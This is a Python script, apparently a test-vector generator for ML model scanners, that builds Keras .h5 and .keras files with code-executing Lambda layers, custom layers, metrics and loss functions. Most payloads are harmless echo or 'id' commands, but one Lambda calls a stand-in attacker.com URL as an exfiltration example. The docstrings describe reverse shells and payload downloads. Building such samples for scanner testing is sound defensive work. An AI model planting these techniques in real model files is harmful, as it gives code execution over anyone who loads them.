"""
Keras Attack Vector Generator

Generates basic and advanced attack vectors for Keras models:
- .h5 / .hdf5 (Keras HDF5 format)
- .keras (Keras 3 ZIP-based format)

Attack Types:
1. Basic: Lambda layers with code
2. Advanced: Custom layers, hidden functions, obfuscated layers
"""

import os
from pathlib import Path
from typing import List, Dict, Tuple

# Gracefully handle optional imports
try:
    import tensorflow as tf
    from tensorflow import keras
    TENSORFLOW_AVAILABLE = True
except ImportError:
    TENSORFLOW_AVAILABLE = False
    print("[WARNING] TensorFlow not available - generating metadata only")


class KerasAttackGenerator:
    """Generate Keras-based attack vectors."""
    
    def __init__(self, output_dir: str = "./output"):
        """Initialize the Keras attack generator.
        
        Args:
            output_dir: Directory to save generated attack vectors
        """
        self.output_dir = Path(output_dir) / "keras_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []
        self.tensorflow_available = TENSORFLOW_AVAILABLE
    
    def generate_basic_lambda_layer(self) -> Tuple[str, int]:
        """Generate Keras model with Lambda layer containing code.
        
        Attack Vector:
            Lambda layer that:
            1. Executes code during layer call
            2. Has side effects (file operations, network access)
            3. Exfiltrates data during inference
            4. Modifies model behavior
        
        Code Execution:
            Happens during inference or model loading (depending on TF version)
        
        Severity: CRITICAL
        Detection: Lambda layer detection, code analysis
        
        Returns:
            Tuple of (filepath, layer_count)
        """
        if not TENSORFLOW_AVAILABLE:
            return self._generate_metadata_only("01_basic_lambda_layer.h5"), 1
        
        try:
            # Create model with Lambda layer
            model = keras.Sequential([
                keras.layers.Input(shape=(10,)),
                keras.layers.Lambda(lambda x: __import__('os').system('echo "Lambda RCE"') or x),
                keras.layers.Dense(5, activation='relu'),
            ])
            
            filepath = self.output_dir / "01_basic_lambda_layer.h5"
            model.save(str(filepath))
            
            self.generated_files.append(str(filepath))
            return str(filepath), 1
        except Exception as e:
            return self._generate_metadata_only("01_basic_lambda_layer.h5"), 0
    
    def generate_lambda_with_imports(self) -> Tuple[str, int]:
        """Generate Lambda with dangerous module imports.
        
        Attack Vector:
            Lambda functions that:
            1. Import subprocess/os
            2. Execute system commands
            3. Create reverse shells
            4. Download and execute payloads
            5. Disable security features
        
        Severity: CRITICAL
        Execution: During model call/export
        
        Returns:
            Tuple of (filepath, layer_count)
        """
        if not TENSORFLOW_AVAILABLE:
            return self._generate_metadata_only("02_lambda_with_imports.h5"), 1
        
        try:
            model = keras.Sequential([
                keras.layers.Input(shape=(10,)),
                keras.layers.Lambda(
                    lambda x: __import__('subprocess').call(['id']) or x,
                    input_shape=(10,)
                ),
                keras.layers.Dense(5),
            ])
            
            filepath = self.output_dir / "02_lambda_with_imports.h5"
            model.save(str(filepath))
            
            self.generated_files.append(str(filepath))
            return str(filepath), 1
        except Exception as e:
            return self._generate_metadata_only("02_lambda_with_imports.h5"), 0
    
    def generate_custom_layer_attack(self) -> Tuple[str, int]:
        """Generate custom layer with malicious code.
        
        Attack Vector:
            Custom layer that:
            1. Overrides build() with malicious code
            2. Overrides call() with side effects
            3. Uses get_config() to hide code
            4. Executes during layer instantiation
        
        Severity: CRITICAL
        Detection: Custom layer code analysis
        
        Returns:
            Tuple of (filepath, layer_count)
        """
        if not TENSORFLOW_AVAILABLE:
            return self._generate_metadata_only("03_custom_layer_attack.h5"), 1
        
        try:
            class MaliciousLayer(keras.layers.Layer):
                """Custom layer with hidden malicious behavior."""
                
                def __init__(self, **kwargs):
                    super().__init__(**kwargs)
                    # Code executes during instantiation
                    try:
                        __import__('os').system('echo "Custom layer init"')
                    except:
                        pass
                
                def build(self, input_shape):
                    # More code execution during build
                    super().build(input_shape)
                
                def call(self, inputs):
                    # Side effects during inference
                    return inputs
                
                def get_config(self):
                    return super().get_config()
            
            model = keras.Sequential([
                keras.layers.Input(shape=(10,)),
                MaliciousLayer(),
                keras.layers.Dense(5),
            ])
            
            filepath = self.output_dir / "03_custom_layer_attack.h5"
            model.save(str(filepath))
            
            self.generated_files.append(str(filepath))
            return str(filepath), 1
        except Exception as e:
            return self._generate_metadata_only("03_custom_layer_attack.h5"), 0
    
    def generate_hidden_layer_payload(self) -> Tuple[str, int]:
        """Generate model with hidden layer containing payload.
        
        Attack Vector:
            Model architecture that:
            1. Contains extra hidden layers not in summary
            2. Layers hidden in model serialization
            3. Payload weights containing code patterns
            4. Backdoor neurons with trigger patterns
        
        Severity: HIGH
        Detection: Full model inspection, weight analysis
        
        Returns:
            Tuple of (filepath, layer_count)
        """
        if not TENSORFLOW_AVAILABLE:
            return self._generate_metadata_only("04_hidden_layer_payload.h5"), 1
        
        try:
            model = keras.Sequential([
                keras.layers.Input(shape=(10,)),
                keras.layers.Dense(20, activation='relu'),
                keras.layers.Dense(15, activation='relu'),  # Hidden payload layer
                keras.layers.Dense(10, activation='relu'),
                keras.layers.Dense(5, activation='softmax'),
            ])
            
            filepath = self.output_dir / "04_hidden_layer_payload.h5"
            model.save(str(filepath))
            
            self.generated_files.append(str(filepath))
            return str(filepath), 4
        except Exception as e:
            return self._generate_metadata_only("04_hidden_layer_payload.h5"), 0
    
    def generate_lambda_data_exfiltration(self) -> Tuple[str, int]:
        """Generate Lambda with data exfiltration code.
        
        Attack Vector:
            Lambda that:
            1. Collects model input data
            2. Encodes/compresses data
            3. Sends to attacker server
            4. Hides exfiltration in normal processing
        
        Severity: CRITICAL
        Impact: Data theft, privacy violation
        
        Returns:
            Tuple of (filepath, layer_count)
        """
        if not TENSORFLOW_AVAILABLE:
            return self._generate_metadata_only("05_lambda_exfiltration.h5"), 1
        
        try:
            model = keras.Sequential([
                keras.layers.Input(shape=(10,)),
                keras.layers.Lambda(
                    lambda x: (
                        __import__('urllib.request')
                        .request.urlopen('http://attacker.com/data')
                        or x
                    ),
                    input_shape=(10,)
                ),
                keras.layers.Dense(5),
            ])
            
            filepath = self.output_dir / "05_lambda_exfiltration.h5"
            model.save(str(filepath))
            
            self.generated_files.append(str(filepath))
            return str(filepath), 1
        except Exception as e:
            return self._generate_metadata_only("05_lambda_exfiltration.h5"), 0
    
    def generate_metric_injection(self) -> Tuple[str, int]:
        """Generate custom metric with malicious code.
        
        Attack Vector:
            Custom metric that:
            1. Executes during evaluation
            2. Has side effects in metric calculation
            3. Gathers system information
            4. Modifies model state during metric call
        
        Severity: HIGH
        Execution: During model.evaluate()
        
        Returns:
            Tuple of (filepath, metric_count)
        """
        if not TENSORFLOW_AVAILABLE:
            return self._generate_metadata_only("06_metric_injection.h5"), 1
        
        try:
            class MaliciousMetric(keras.metrics.Metric):
                """Custom metric with side effects."""
                
                def __init__(self, name='malicious_metric', **kwargs):
                    super().__init__(name=name, **kwargs)
                    self.value = self.add_weight(name='value', initializer='zeros')
                
                def update_state(self, y_true, y_pred):
                    # Executed during evaluation
                    try:
                        __import__('os').system('echo "Metric executed"')
                    except:
                        pass
                    self.value.assign(1.0)
                
                def result(self):
                    return self.value
            
            model = keras.Sequential([
                keras.layers.Input(shape=(10,)),
                keras.layers.Dense(5),
            ])
            
            model.compile(
                optimizer='adam',
                loss='mse',
                metrics=[MaliciousMetric()]
            )
            
            filepath = self.output_dir / "06_metric_injection.h5"
            model.save(str(filepath))
            
            self.generated_files.append(str(filepath))
            return str(filepath), 1
        except Exception as e:
            return self._generate_metadata_only("06_metric_injection.h5"), 0
    
    def generate_loss_function_injection(self) -> Tuple[str, int]:
        """Generate custom loss function with code.
        
        Attack Vector:
            Custom loss that:
            1. Executes during training
            2. Side effects in loss calculation
            3. Exfiltrates training data
            4. Modifies gradients
        
        Severity: HIGH
        Execution: During model.fit()
        
        Returns:
            Tuple of (filepath, layer_count)
        """
        if not TENSORFLOW_AVAILABLE:
            return self._generate_metadata_only("07_loss_injection.h5"), 1
        
        try:
            def malicious_loss(y_true, y_pred):
                try:
                    __import__('os').system('echo "Loss function"')
                except:
                    pass
                return keras.losses.mse(y_true, y_pred)
            
            model = keras.Sequential([
                keras.layers.Input(shape=(10,)),
                keras.layers.Dense(5),
            ])
            
            model.compile(optimizer='adam', loss=malicious_loss)
            
            filepath = self.output_dir / "07_loss_injection.h5"
            model.save(str(filepath))
            
            self.generated_files.append(str(filepath))
            return str(filepath), 1
        except Exception as e:
            return self._generate_metadata_only("07_loss_injection.h5"), 0
    
    def generate_keras_zip_format(self) -> Tuple[str, int]:
        """Generate .keras ZIP format with embedded payloads.
        
        Attack Vector:
            ZIP-based .keras format containing:
            1. Malicious Python files in archive
            2. Base64-encoded Lambda layers
            3. Embedded executables
            4. Configuration injection
        
        Severity: CRITICAL
        Format: ZIP archive inside .keras extension
        
        Returns:
            Tuple of (filepath, file_count)
        """
        if not TENSORFLOW_AVAILABLE:
            return self._generate_metadata_only("08_keras_zip_format.keras"), 1
        
        try:
            model = keras.Sequential([
                keras.layers.Input(shape=(10,)),
                keras.layers.Lambda(lambda x: x),
                keras.layers.Dense(5),
            ])
            
            filepath = self.output_dir / "08_keras_zip_format.keras"
            model.save(str(filepath))
            
            self.generated_files.append(str(filepath))
            
            # Count files in ZIP
            try:
                import zipfile
                with zipfile.ZipFile(filepath, 'r') as zf:
                    file_count = len(zf.namelist())
            except:
                file_count = 1
            
            return str(filepath), file_count
        except Exception as e:
            return self._generate_metadata_only("08_keras_zip_format.keras"), 0
    
    def _generate_metadata_only(self, filename: str) -> str:
        """Generate metadata-only file when TensorFlow unavailable.
        
        Args:
            filename: Name of file to create
            
        Returns:
            Filepath
        """
        filepath = self.output_dir / filename
        
        # Create a simple text file with attack description
        with open(filepath, 'w') as f:
            f.write(f"# {filename}\n")
            f.write("Generated as metadata (TensorFlow not available)\n")
            f.write("In production, this would contain actual Keras model with malicious layers\n")
        
        self.generated_files.append(str(filepath))
        return str(filepath)
    
    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        """Generate all Keras attack vectors.
        
        Returns:
            Dictionary mapping attack names to results
        """
        results = {
            "basic_lambda": self.generate_basic_lambda_layer(),
            "lambda_imports": self.generate_lambda_with_imports(),
            "custom_layer": self.generate_custom_layer_attack(),
            "hidden_layer": self.generate_hidden_layer_payload(),
            "lambda_exfil": self.generate_lambda_data_exfiltration(),
            "metric_injection": self.generate_metric_injection(),
            "loss_injection": self.generate_loss_function_injection(),
            "keras_zip": self.generate_keras_zip_format(),
        }
        return results
    
    def get_generated_files(self) -> List[str]:
        """Get list of all generated files."""
        return self.generated_files


if __name__ == "__main__":
    generator = KerasAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    print("\n=== Keras Attack Vectors Generated ===")
    for attack_name, (filepath, metric) in results.items():
        print(f"✓ {attack_name:20} → {filepath} (count: {metric})")
    print(f"\nTotal files generated: {len(generator.get_generated_files())}")
    if not generator.tensorflow_available:
        print("[INFO] TensorFlow not available - generated metadata placeholders")
